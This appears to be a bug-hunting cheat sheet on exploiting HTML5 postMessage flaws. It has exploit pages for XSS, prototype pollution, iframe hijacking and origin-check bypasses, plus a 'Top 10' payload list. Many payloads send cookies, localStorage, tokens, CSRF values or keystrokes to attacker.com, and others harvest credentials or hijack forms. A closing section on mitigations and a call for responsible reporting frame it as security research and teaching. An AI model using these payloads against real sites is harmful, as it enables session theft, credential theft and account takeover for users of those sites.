## 📋 Overview

PostMessage is an HTML5 API that enables **cross-origin communication** between Window objects (e.g., between a page and its iframe, popup, or embedded content). It's an alternative to JSONP and CORS-based XHR requests for safely sending data between different origins.

**Why PostMessage Exists:** Modern browsers enforce the **Same Origin Policy (SOP)** - a critical security boundary that restricts how documents from different origins interact. PostMessage provides a controlled way to bypass this restriction when legitimate cross-origin communication is needed.

**Same Origin Policy Quick Reference:** Two URLs share the same origin only if their **protocol**, **host**, and **port** match exactly.

|URL|Comparison to `http://store.company.com/dir/page.html`|Result|
|---|---|---|
|`http://store.company.com/dir2/other.html`|Only path differs|✅ Same Origin|
|`https://store.company.com/page.html`|Different protocol|❌ Different Origin|
|`http://store.company.com:81/dir/page.html`|Different port|❌ Different Origin|
|`http://news.company.com/dir/page.html`|Different host|❌ Different Origin|

**The Security Risk:** When PostMessage is implemented incorrectly (missing origin validation, wildcard target origins, unsafe data handling), it can lead to **Cross-Site Scripting (XSS)**, **data theft**, **prototype pollution**, and **information disclosure**.

---

## 🔧 PostMessage Syntax & Basic Usage

### Sending Messages

```javascript
targetWindow.postMessage(message, targetOrigin, [transfer]);
```

**Examples:**

```javascript
// postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":true}}', '*')

// postMessage to iframe by ID
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":true}}', '*')

// postMessage to iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

// postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":true}}', '*')

// postMessage to specific origin
window.postMessage('{"__proto__":{"isAdmin":true}}', 'https://company.com')

// postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
// Loop until win.length == 1 (iframe loaded)
win[0].postMessage('{"__proto__":{"isAdmin":true}}', '*')
```

**Key Parameters:**

- **targetOrigin**: Can be `'*'` (wildcard - any domain) or specific URL like `'https://company.com'`
- If wildcard used: messages sent to any domain (origin of Window object)
- If URL specified: message only sent to that domain (even if Window origin differs)

### Receiving Messages

```javascript
window.addEventListener("message", (event) => {
  if (event.origin !== "http://example.org:8080") return;
  
  // Process event.data here
}, false);
```

**Alternative jQuery syntax:**

```javascript
$(window).on('message', function(event) { ... });
```

---

## 🔍 Enumeration & Detection

### 🎯 Quick Detection Strategy

**Focus Areas:**

- Locate event listeners in JavaScript code
- Identify origin validation gaps
- Map message flow between windows

**Action Steps:**

1. **Manual JavaScript Analysis**
    
    - Search for `window.addEventListener` and `$(window).on`
    - Look for `postMessage` calls with wildcards
2. **Browser Developer Tools Console**
    
    ```javascript
    getEventListeners(window)
    ```
    
3. **Browser Developer Tools Elements Tab**
    
    - Navigate to: **Elements → Event Listeners**
    - Filter for "message" events
4. **Browser Extensions** (Automated Detection)
    
    - [Posta](https://github.com/benso-io/posta) - Intercepts and displays all postMessage traffic
    - [postMessage-tracker](https://github.com/fransr/postMessage-tracker) - Monitors postMessage events
    - PMHook with TamperMonkey
5. **Online Testing Tools**
    
    - [https://sentinel.appcheck-ng.com/static/pm/replay.html](https://sentinel.appcheck-ng.com/static/pm/replay.html)
    - [https://tools.honoki.net/postmessage.html](https://tools.honoki.net/postmessage.html)

**Motivation Boost:** 🚀 Finding one vulnerable listener can unlock an entire application's security boundary!

---

## ⚔️ Exploitation Methods

### 🎯 Vulnerability Assessment Checklist

Before exploitation, verify these conditions:

**Critical Security Checks:**

- [ ] Is origin validation missing or bypassable?
- [ ] Is targetOrigin set to wildcard `'*'`?
- [ ] Does the receiver perform sensitive operations (DOM manipulation, authentication changes)?
- [ ] Can the page be iframed? (Check X-Frame-Options header)
- [ ] Is `event.source` validation present?
- [ ] Does the handler use unsafe functions (innerHTML, eval, Function constructor)?

---

### 1️⃣ Missing Origin Validation → XSS

**Attack Pattern:** When the receiver doesn't validate `event.origin`, attackers can send malicious payloads from any domain.

**Vulnerable Code Example:**

```javascript
window.addEventListener("message", (event) => {
  // NO ORIGIN CHECK!
  document.getElementById('content').innerHTML = event.data;
});
```

**Exploitation Steps:**

1. **Identify Missing Validation**
    
    - Receiver lacks: `if (event.origin !== "https://trusted.com") return;`
2. **Verify Wildcard TargetOrigin**
    
    - Sender uses: `targetWindow.postMessage(data, "*")`
3. **Craft Exploit Page**
    
    ```html
    <html>
      <body>
        <iframe id="victim" src="https://vulnerable-app.com"></iframe>
        <script>
          setTimeout(() => {
            const frame = document.getElementById('victim').contentWindow;
            frame.postMessage('<img src=x onerror="alert(document.cookie)">', '*');
          }, 2000);
        </script>
      </body>
    </html>
    ```
    

**Mental Hack:** Each missing validation is a door waiting to be opened! 🚪

---

### 2️⃣ Iframe + Wildcard TargetOrigin → Data Theft

**Attack Pattern:** If a page can be iframed and sends sensitive data via postMessage with wildcard `'*'`, attackers can hijack the iframe's origin to leak data.

**Requirements:**

- Target page has no `X-Frame-Options` or `Content-Security-Policy: frame-ancestors`
- Sender uses wildcard: `postMessage(sensitiveData, '*')`

**Exploitation:**

```html
<html>
  <iframe src="https://docs.google.com/document/ID" />
  <script>
    setTimeout(exp, 6000); // Wait for iframe load

    function exp() {
      // Change iframe origin repeatedly
      setInterval(function() {
        window.frames[0].frame[0][2].location = "https://attacker.com/exploit.html";
      }, 100);
    }
  </script>
</html>
```

**What Happens:**

- Victim iframe loads normally
- Attacker script changes iframe location to attacker-controlled domain
- Parent sends postMessage with wildcard
- Message delivered to attacker's domain instead

---

### 3️⃣ Prototype Pollution via PostMessage

**Attack Pattern:** When postMessage data is processed without sanitization, attackers can pollute JavaScript prototypes leading to XSS or privilege escalation.

**Vulnerable Pattern:**

```javascript
window.addEventListener("message", (event) => {
  const data = JSON.parse(event.data);
  Object.assign(userConfig, data); // Prototype pollution!
});
```

**Exploitation Payload:**

```html
<html>
  <body>
    <iframe id="victim" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
    <script>
      function exploit() {
        document.getElementById('victim').contentWindow.postMessage(
          '{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(r => r.json()).then(d => {alert(d[\'result\'][0][\'code\']);})\\" />"}}}',
          '*'
        );
        
        // Trigger the polluted property
        document.getElementById('victim').contentWindow.postMessage(
          JSON.stringify("refresh"),
          '*'
        );
      }

      setTimeout(exploit, 2000);
    </script>
  </body>
</html>
```

---

### 4️⃣ Blocking Main Page to Steal PostMessage

**Advanced Attack Pattern:** When a parent sends sensitive data to a child iframe, attackers can:

1. Block the parent page execution
2. Inject XSS payload into child iframe
3. Steal the message before legitimate handler processes it

**Scenario:**

```javascript
// Parent sends flag to iframe
iframe.postMessage({flag: "SECRET_FLAG"}, "*");
```

**Exploitation Technique:**

**Key Insight:** Blob documents from null origins are isolated. If you keep the main page busy, the iframe executes independently.

**Steps:**

1. **Create Isolated Iframe**
    
    ```javascript
    const iframe = document.createElement('iframe');
    iframe.src = "blob:null/..."; // Null origin
    ```
    
2. **Block Parent with Heavy Operation**
    
    ```javascript
    // Send massive data to trigger slow string conversion
    const buffer = new Uint8Array(1e7);
    parentWindow.postMessage(buffer, '*', [buffer.buffer]);
    ```
    
3. **Inject Listener in Iframe** (timing critical)
    
    ```javascript
    // Use setTimeout with precise milliseconds
    setTimeout(() => {
      window.addEventListener('message', (e) => {
        // Leak e.data to attacker server
        fetch('https://attacker.com/leak?data=' + e.data.flag);
      });
    }, PRECISE_TIMING_MS);
    ```
    

**Complete Exploit:**

```html
<script>
  const win = window.open('https://vulnerable-app.com');
  
  setTimeout(() => {
    // Block parent
    const buffer = new Uint8Array(1e7);
    win.postMessage(buffer, '*', [buffer.buffer]);
    
    // Inject payload in iframe while parent is busy
    win.frames[0].postMessage('<script>window.addEventListener("message", e => fetch("https://attacker.com?"+e.data))<\/script>', '*');
  }, CALCULATED_DELAY);
</script>
```

---

### 5️⃣ Changing Child Iframe Location to Steal Messages

**Attack Pattern:** If you can iframe a page containing another iframe, you can change that child iframe's location to your domain and intercept wildcard postMessages.

**Requirements:**

- Parent page has no X-Frame-Options
- Parent contains child iframe
- Messages sent with wildcard `'*'`

**Exploitation:**

```html
<html>
  <iframe src="https://abc.com/page-with-iframe" />
  <script>
    setTimeout(function() {
      setInterval(function() {
        // Change location of nested iframe
        window.frames[0].frames[0].location = "https://attacker.com/steal.html";
      }, 100);
    }, 6000);
  </script>
</html>
```

**On attacker.com/steal.html:**

```javascript
window.addEventListener('message', (e) => {
  fetch('https://attacker.com/log?data=' + JSON.stringify(e.data));
});
```

---

## 🛡️ Origin Validation Bypasses

### Bypass Strategy Overview

**Focus Areas:**

- Weak string matching functions
- Null origin scenarios
- Source manipulation techniques

---

### 1️⃣ `indexOf()` Bypass

**Vulnerable Code:**

```javascript
if (event.origin.indexOf("https://app-sj17.ma") !== -1) {
  // Process message
}
```

**Why It Fails:** `indexOf()` performs substring matching, not domain validation.

**Bypass:**

```javascript
// Attacker domain: https://app-sj17.ma.evil.com
// indexOf() returns 0, bypass succeeds!
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma") // 0 (true)
```

---

### 2️⃣ `search()` Bypass

**Vulnerable Code:**

```javascript
if (event.origin.search("www.safedomain.com") !== -1) {
  // Process message
}
```

**Why It Fails:** `search()` expects regex. Dots (`.`) become wildcards.

**Bypass:**

```javascript
// Attacker domain: www.s<any>fedomain.com
"https://www.safedomain.com".search("www.s.fedomain.com") // Match!
```

---

### 3️⃣ `match()` Regex Bypass

**Vulnerable Code:**

```javascript
if (event.origin.match(/https:\/\/.*\.example\.com/)) {
  // Process message
}
```

**Bypass Technique:**

- Craft domains like: `https://example.com.attacker.com`
- Improper anchoring allows subdomain matching

---

### 4️⃣ `escapeHtml()` Bypass via File Object

**Vulnerable Code:**

```javascript
function escapeHtml(obj) {
  for (let prop in obj) {
    if (obj.hasOwnProperty(prop)) {
      obj[prop] = obj[prop].replace(/</g, '&lt;');
    }
  }
  return obj;
}

window.addEventListener('message', (e) => {
  const safe = escapeHtml(e.data);
  div.innerHTML = safe.message;
});
```

**Why It Fails:** `File` objects have read-only `name` property that doesn't acknowledge `hasOwnProperty`.

**Bypass:**

```javascript
// Normal object - escapeHtml works
const data1 = {message: "'\"<b>\\"};
// Escaped: &#39;&quot;&lt;b&gt;

// File object - bypass
const file = new File([""], "'\"<b>\\");
// file.name returns: '"<b>\ (unescaped!)

// Send via postMessage
targetWindow.postMessage(file, '*');
```

---

### 5️⃣ Null Origin Exploits

#### Technique A: Sandboxed Iframe → Null Origin

**Key Insight:**

```html
<iframe sandbox="allow-scripts" src="https://target.com">
```

When embedded in sandboxed iframe, `window.origin === null`.

**Exploitation:**

```javascript
// Both iframe and embedded page have null origin
// Bypass: event.origin === window.origin (null === null)
```

#### Technique B: Popup Inheritance

**Key Insight:** Popups opened from sandboxed iframes inherit sandbox restrictions.

```html
<iframe sandbox="allow-scripts allow-popups" srcdoc="
  <script>
    const popup = window.open('https://target.com');
    // popup.origin === null (inherited sandbox)
  </script>
">
```

**Complete Exploit (SOP Bypass):**

```html
<body>
  <script>
    f = document.createElement("iframe");
    f.sandbox = "allow-scripts allow-popups allow-top-navigation";

    // Payload for second stage XSS
    const payload = `
      x = opener.top;
      opener.postMessage(1, '*');
      setTimeout(() => {
        x.postMessage({
          type: 'render',
          identifier,
          body: '<img src=x onerror=alert(localStorage.flag)>'
        }, '*');
      }, 1000);
    `.replaceAll("\n", " ");

    // Initial iframe that opens popup
    f.srcdoc = `
      <h1>Click me!</h1>
      <script>
        onclick = e => {
          let w = open('https://target.com/vulnerable.php');
          onmessage = e => top.location = 'https://target.com/vulnerable.php';
          setTimeout(() => {
            w.postMessage({
              type: "render",
              body: "<audio src=x onerror=\\"${payload}\\">"
            }, '*');
          }, 1000);
        };
      <\/script>
    `;
    
    document.body.appendChild(f);
  </script>
</body>
```

---

### 6️⃣ `event.source` Bypass

**Vulnerable Check:**

```javascript
window.addEventListener('message', (e) => {
  if (e.source !== window) return;
  // Process message
});
```

**Bypass Technique:** Create iframe, send message, immediately delete iframe → `e.source === null`.

```javascript
let iframe = document.createElement("iframe");
document.body.appendChild(iframe);

window.target = window.open("http://localhost:8080/");
await new Promise(r => setTimeout(r, 2000));

iframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`);
document.body.removeChild(iframe); // e.source === null
```

---

### 7️⃣ DOM Clobbering to Bypass Checks

**Vulnerable Code:**

```javascript
if (e.source === window.calc.contentWindow && e.data.token === window.token) {
  // Trusted message
}
```

**Bypass Strategy:**

1. **Clobber `document.getElementById`**
    
    ```html
    <img name="getElementById" />
    <div id="calc"></div>
    ```
    
    Result: `window.calc === undefined`
    
2. **Make `e.source` null** (delete iframe after sending)
    
3. **Exploit `null == undefined`**
    
    ```javascript
    // Both sides undefined/null
    undefined == null // true
    ```
    

**Complete Exploit:**

```html
<script>
  // Clobber document.getElementById
  open('https://target.com/?expr="<form name=getElementById id=calc>"');

  function start() {
    var ifr = document.createElement("iframe");
    ifr.sandbox = "allow-scripts allow-popups";
    
    ifr.srcdoc = `<script>(${hack})()<\/script>`;
    document.body.appendChild(ifr);

    function hack() {
      var win = open("https://target.com");
      setTimeout(() => {
        parent.postMessage("remove", "*");
        win.postMessage({
          token: null,
          result: "<img src=x onerror='location=`https://attacker.com/?t=${escape(window.results.innerHTML)}`'>"
        }, "*");
      }, 1000);
    }

    onmessage = (e) => {
      if (e.data === "remove") document.body.innerHTML = "";
    };
  }

  setTimeout(start, 1000);
</script>
```

---

### 8️⃣ `document.domain` Manipulation

**Technique:** JavaScript can shorten `document.domain` to parent domain, relaxing SOP.

```javascript
// From subdomain.example.com
document.domain = "example.com";

// Now can access parent domain resources
```

**Note:** Modern browsers are deprecating this technique.

---

### 9️⃣ `event.isTrusted` - Not Always Reliable

**What It Is:** `event.isTrusted` returns `true` only for genuine user-generated events.

**Limitation:** While challenging to bypass, relying solely on this check is insufficient. Always combine with origin validation.

---

## 🎯 Top 10 Modern Exploitation Payloads

### 1. Cookie Stealer (Basic XSS)

```javascript
targetWindow.postMessage(
  '<img src=x onerror="fetch(\'https://attacker.com?c=\'+document.cookie)">',
  '*'
);
```

### 2. Prototype Pollution → XSS

```javascript
targetWindow.postMessage(
  '{"__proto__":{"isAdmin":true,"xss":"<img src=x onerror=alert(1)>"}}',
  '*'
);
```

### 3. localStorage Exfiltration

```javascript
targetWindow.postMessage(
  '<img src=x onerror="fetch(\'https://attacker.com?data=\'+btoa(JSON.stringify(localStorage)))">',
  '*'
);
```

### 4. Token Theft via Fetch

```javascript
targetWindow.postMessage(
  '<script>fetch("/api/user").then(r=>r.json()).then(d=>fetch("https://attacker.com?token="+d.token))<\/script>',
  '*'
);
```

### 5. Form Hijacking

```javascript
targetWindow.postMessage(
  '<script>document.forms[0].action="https://attacker.com/phish";document.forms[0].submit()<\/script>',
  '*'
);
```

### 6. Service Worker Registration

```javascript
targetWindow.postMessage(
  '<script>navigator.serviceWorker.register("https://attacker.com/malicious-sw.js")<\/script>',
  '*'
);
```

### 7. WebSocket Hijack

```javascript
targetWindow.postMessage(
  '<script>WebSocket=new Proxy(WebSocket,{construct(t,a){a[0]=a[0].replace("wss://legit","wss://attacker.com");return new t(...a)}})<\/script>',
  '*'
);
```

### 8. Credential Harvesting

```javascript
targetWindow.postMessage(
  '<script>document.body.innerHTML=\'<form action="https://attacker.com"><input name=user><input name=pass type=password><button>Login</button></form>\'<\/script>',
  '*'
);
```

### 9. CSRF Token Leak

```javascript
targetWindow.postMessage(
  '<script>fetch("/sensitive").then(r=>r.text()).then(html=>{const token=html.match(/csrf=([^"]+)/)[1];fetch("https://attacker.com?csrf="+token)})<\/script>',
  '*'
);
```

### 10. Keylogger Injection

```javascript
targetWindow.postMessage(
  '<script>document.onkeypress=e=>fetch("https://attacker.com/log?k="+e.key)<\/script>',
  '*'
);
```

---

## 🔥 Higher Impact Scenarios

### Scenario 1: Authentication Bypass via PostMessage

**Vulnerable Flow:**

```javascript
window.addEventListener('message', (e) => {
  if (e.data.action === 'setUser') {
    currentUser = e.data.user; // No validation!
    localStorage.setItem('user', JSON.stringify(e.data.user));
  }
});
```

**Impact:** Full account takeover

**Exploit:**

```javascript
targetWindow.postMessage({
  action: 'setUser',
  user: {id: 1, role: 'admin', username: 'attacker'}
}, '*');
```

---

### Scenario 2: Password Reset Token Theft

**Vulnerable Implementation:**

```javascript
// Parent sends reset token to iframe
iframe.postMessage({token: resetToken}, '*');
```

**Attack:**

1. Iframe the password reset page
2. Change iframe location to attacker domain
3. Intercept token via postMessage listener

---

### Scenario 3: Payment Flow Manipulation

**Vulnerable Code:**

```javascript
window.addEventListener('message', (e) => {
  if (e.data.action === 'updateAmount') {
    paymentAmount = e.data.amount;
  }
});
```

**Exploit:**

```javascript
targetWindow.postMessage({
  action: 'updateAmount',
  amount: 0.01 // Change $1000 to $0.01
}, '*');
```

---

### Scenario 4: OAuth Token Leakage

**Vulnerable Pattern:**

```javascript
// OAuth callback sends token to opener
window.opener.postMessage({access_token: token}, '*');
```

**Attack:** Open OAuth popup from attacker domain → intercept token.

---

## 🛡️ Security Mitigations

### ✅ Secure Implementation Checklist

#### For Message Senders

1. **Never Use Wildcard TargetOrigin**
    
    ```javascript
    // ❌ UNSAFE
    targetWindow.postMessage(data, '*');
    
    // ✅ SAFE
    targetWindow.postMessage(data, 'https://trusted-domain.com');
    ```
    
2. **Validate Recipient Before Sending**
    
    ```javascript
    if (iframe.contentWindow.origin === 'https://trusted.com') {
      iframe.contentWindow.postMessage(data, 'https://trusted.com');
    }
    ```
    
3. **Minimize Sensitive Data Transmission**
    
    - Don't send passwords, tokens, or PII via postMessage
    - Use session-based authentication instead

---

#### For Message Receivers

1. **Always Validate Origin**
    
    ```javascript
    window.addEventListener('message', (event) => {
      // Strict origin check (use === not ==)
      if (event.origin !== 'https://trusted-domain.com') {
        return; // Reject message
      }
      
      // Process event.data
    });
    ```
    
2. **Whitelist Multiple Origins Securely**
    
    ```javascript
    const ALLOWED_ORIGINS = [
      'https://app.example.com',
      'https://admin.example.com'
    ];
    
    window.addEventListener('message', (event) => {
      if (!ALLOWED_ORIGINS.includes(event.origin)) {
        return;
      }
      
      // Process event.data
    });
    ```
    
3. **Validate Message Source**
    
    ```javascript
    window.addEventListener('message', (event) => {
      if (event.source !== expectedWindow) {
        return;
      }
      
      // Process event.data
    });
    ```
    
4. **Sanitize All Data**
    
    ```javascript
    window.addEventListener('message', (event) => {
      if (event.origin !== TRUSTED_ORIGIN) return;
      
      // Use DOMPurify or similar
      const clean = DOMPurify.sanitize(event.data);
      element.innerHTML = clean;
    });
    ```
    
5. **Never Use `eval()` or `Function()` with PostMessage Data**
    
    ```javascript
    // ❌ NEVER DO THIS
    window.addEventListener('message', (event) => {
      eval(event.data); // Critical vulnerability!
    });
    ```
    
6. **Implement Message Type Validation**
    
    ```javascript
    const ALLOWED_ACTIONS = ['updateConfig', 'fetchData'];
    
    window.addEventListener('message', (event) => {
      if (event.origin !== TRUSTED_ORIGIN) return;
      
      if (!ALLOWED_ACTIONS.includes(event.data.action)) {
        console.warn('Invalid action:', event.data.action);
        return;
      }
      
      // Process valid action
    });
    ```
    
7. **Use Structured Data with Schema Validation**
    
    ```javascript
    const Joi = require('joi');
    
    const messageSchema = Joi.object({
      action: Joi.string().valid('update', 'delete').required(),
      id: Joi.number().integer().required()
    });
    
    window.addEventListener('message', (event) => {
      if (event.origin !== TRUSTED_ORIGIN) return;
      
      const { error, value } = messageSchema.validate(event.data);
      if (error) {
        console.error('Invalid message schema:', error);
        return;
      }
      
      // Process validated data
    });
    ```
    

---

#### Additional Security Measures

8. **Implement Rate Limiting**
    
    ```javascript
    let messageCount = 0;
    const RATE_LIMIT = 10; // 10 messages per minute
    
    window.addEventListener('message', (event) => {
      if (event.origin !== TRUSTED_ORIGIN) return;
      
      messageCount++;
      if (messageCount > RATE_LIMIT) {
        console.warn('Rate limit exceeded');
        return;
      }
      
      // Reset counter after 1 minute
      setTimeout(() => { messageCount = 0; }, 60000);
    });
    ```
    
9. **Log Suspicious Activity**
    
    ```javascript
    window.addEventListener('message', (event) => {
      if (event.origin !== TRUSTED_ORIGIN) {
        // Log to security monitoring system
        logSecurityEvent({
          type: 'untrusted_postmessage',
          origin: event.origin,
          timestamp: Date.now()
        });
        return;
      }
    });
    ```
    
10. **Deploy Content Security Policy**
    
    ```html
    <meta http-equiv="Content-Security-Policy" 
          content="frame-ancestors 'self' https://trusted-domain.com;">
    ```
    
11. **Use X-Frame-Options**
    
    ```
    X-Frame-Options: DENY
    X-Frame-Options: SAMEORIGIN
    X-Frame-Options: ALLOW-FROM https://trusted-domain.com
    ```
    

---

## 📚 Practice & References

### Practice Platforms

- [EventListener XSS Recon Lab](https://github.com/yavolo/eventlistener-xss-recon)
- [Terjanq's Same-Origin XSS Challenge](https://github.com/terjanq/same-origin-xss)
- [Project Sekai CTF - Obligatory Calc](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc)

### Essential Reading

- [MDN: Window.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
- [Dom XSS PostMessage by jlajara](https://jlajara.gitlab.io/web/2020/06/12/Dom_XSS_PostMessage.html)
- [Dom XSS PostMessage 2 by jlajara](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [Terjanq's Winning RCs with Iframes](https://gist.github.com/terjanq/7c1a71b83db5e02253c218765f96a710)
- [Google VRP: Hijacking Screenshots](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)
- [How to Spot and Exploit postMessage Vulnerabilities](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)

---

## 🚀 Final Motivation

**Remember:** PostMessage vulnerabilities are among the most overlooked but impactful client-side security issues. Every cross-origin communication point is a potential entry into an application's core security boundaries.

**Your Action Plan:**

1. 🔍 Enumerate all postMessage listeners
2. ✅ Verify origin validation exists and can't be bypassed
3. 🎯 Test with crafted payloads
4. 📊 Document findings with impact analysis
5. 🛡️ Report responsibly

**Every vulnerability you find makes the web safer—keep hunting!** 🔥

---

_Last Updated: Based on modern web security research through 2024_